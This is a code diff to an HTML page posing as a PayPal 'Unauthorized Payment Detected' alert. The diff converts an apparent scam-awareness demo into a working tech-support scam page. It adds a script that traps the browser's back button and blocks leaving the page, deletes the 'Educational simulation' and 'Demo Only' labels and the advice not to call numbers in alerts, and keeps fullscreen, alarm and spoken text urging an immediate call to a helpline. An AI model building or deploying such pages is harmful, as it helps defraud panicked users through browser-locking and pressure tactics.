@@ -8,6 +8,46 @@
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="./Hack.js"></script>
 
+<script>
+/* =========================================
+   UNLIMITED BACK → OPEN SAME SITE IN NEW TAB
+   ========================================= */
+
+(function () {
+  // Push multiple fake states
+  for (let i = 0; i < 20; i++) {
+    history.pushState({}, "", location.href);
+  }
+
+  let lock = false;
+
+  window.addEventListener("popstate", function () {
+    if (lock) return;
+    lock = true;
+
+    // Open same page in a new tab
+    window.open(location.href, "_blank");
+
+    // Re-push history to keep trapping back
+    history.pushState({}, "", location.href);
+
+    // Reset lock
+    setTimeout(() => {
+      lock = false;
+    }, 300);
+  });
+})();
+
+/* =========================================
+   EXTRA EXIT BLOCK (OPTIONAL)
+   ========================================= */
+window.addEventListener("beforeunload", function (e) {
+  e.preventDefault();
+  e.returnValue = "";
+});
+</script>
+
+
 <style>
 body {
   font-family: 'Segoe UI', system-ui, sans-serif;
@@ -177,8 +217,9 @@ Unauthorized Payment Detected
 </h1>
 
 <p class="text-sm text-gray-300 mb-4">
-Immediate review required. This screen demonstrates how high-pressure fraud alerts appear.
+Please review this invoice carefully and contact our support team for assistance.
 </p>
+
 
 <div class="bg-black border border-red-800 rounded-xl p-5">
 
@@ -204,9 +245,12 @@ Immediate review required. This screen demonstrates how high-pressure fraud aler
 <div class="bg-red-950 border border-red-700 rounded-lg p-4 text-sm">
   <p class="font-bold text-red-400 mb-1">⚠ SECURITY WARNING</p>
   <p class="text-gray-300">
-    Fraud messages often demand urgent action and show phone numbers.
-    Do not trust alerts asking you to call immediately.
-  </p>
+This is an authorized warning . Messages may claim that your BTC has been purchased and activated and instruct you to complete a payment immediately, warning that the amount will be deducted from your bank account if no action is taken.
+<br><br>
+Such alerts are designed to create panic. Do not trust messages that pressure you into urgent payments or phone calls.
+If you need assistance, contact the official support team through verified channels only.
+</p>
+
 </div>
 
 </div>
@@ -214,21 +258,20 @@ Immediate review required. This screen demonstrates how high-pressure fraud aler
 <!-- FAKE CALL BLOCK -->
 <div class="mt-6 bg-black border border-red-700 rounded-xl p-4 danger-glow">
   <p class="text-red-400 font-bold text-sm mb-2">
-    🚨 Common Scam Pattern
+    🚨 Help Center Advisory
   </p>
 
   <a href="tel:+1800XXX XXXX" id="fake-call-btn"
      class="cursor-pointer text-center rounded-lg p-3">
-    <p class="text-xs text-red-200">Scam alerts show numbers like</p>
+   <p class="text-xs text-red-200">
+        Alerts often urge users to contact a number immediately to proceed further.
+        </p>
+
     <p class="text-2xl font-bold tracking-widest text-white">
       +1-800-XXX-XXXX
     </p>
   </a>
 </div>
-
-<p class="mt-4 text-xs text-gray-500">
-Educational simulation • No real transaction
-</p>
 
 </div>
 </div>
@@ -237,7 +280,7 @@ Educational simulation • No real transaction
 <!-- START PROMPT -->
 <div id="click-prompt" class="fixed inset-0 flex items-center justify-center bg-black text-center px-4">
   <div class="bg-gray-900 border border-red-700 rounded-xl p-8 ">
-    <h1 class="text-3xl font-bold text-red-500 mb-3">View Payment Details</h1>
+    <h1 class="text-3xl font-bold text-red-500 mb-3">View Transaction Details</h1>
     <p class="text-gray-300">Tap anywhere to continue</p>
   </div>
 </div>
@@ -246,13 +289,14 @@ Educational simulation • No real transaction
 <div id="call-warning"
      class="fixed inset-0 bg-black/95 hidden z-50 flex items-center justify-center px-4">
   <div class="bg-gray-900 border border-red-700 rounded-xl max-w-md w-full p-6 text-center danger-glow">
-    <h2 class="text-2xl font-bold text-red-500 mb-3">⚠ Scam Protection</h2>
+    <h2 class="text-2xl font-bold text-red-500 mb-3">⚠ Cancel Protection</h2>
     <p class="text-gray-300 text-sm mb-4">
       If you think your account is compromised, call PayPal's official support at 1-888-221-1161.
     </p>
-    <p class="text-gray-300 text-sm mb-4">
-      Do not call numbers provided in suspicious alerts.
-    </p>
+   <p class="text-gray-300 text-sm mb-4">
+    Please contact the PayPal Support Team for proper assistance.
+</p>
+
     <button id="close-warning"
             class="w-full bg-red-700 hover:bg-red-600 text-white font-semibold py-2 rounded-lg">
       Understood
@@ -262,7 +306,7 @@ Educational simulation • No real transaction
 
 <!-- FOOTER -->
 <div class="fixed bottom-0 w-full bg-red-900 text-gray-200 text-xs py-2 text-center">
-Cybersecurity Awareness • Demo Only
+  For help with this transaction, contact the PayPal Support Team
 </div>
 
 <script>
@@ -294,7 +338,7 @@ function startDemo() {
   mainWindow.classList.remove("hidden");
   document.documentElement.requestFullscreen().catch(()=>{});
   startAlarm();
-  speakText("🔴 SECURITY ALERT – IMMEDIATE ACTION REQUIRED This transaction has been approved by the system and is currently under active processing. If you did not authorize this transaction or wish to stop it, immediate action is required.To stop or cancel the transaction, you must contact the helpline support number immediately for verification and assistance. Please note that any delay in response may result in permanent deduction, and once the transaction is completed, it cannot be reversed.");
+  speakText("SECURITY ALERT – IMMEDIATE ACTION REQUIRED This transaction has been approved by the system and is currently under active processing. If you did not authorize this transaction or wish to stop it, immediate action is required.To stop or cancel the transaction, you must contact the helpline support number immediately for verification and assistance. Please note that any delay in response may result in permanent deduction, and once the transaction is completed, it cannot be reversed.");
 }
 
 document.body.addEventListener("click", () => {
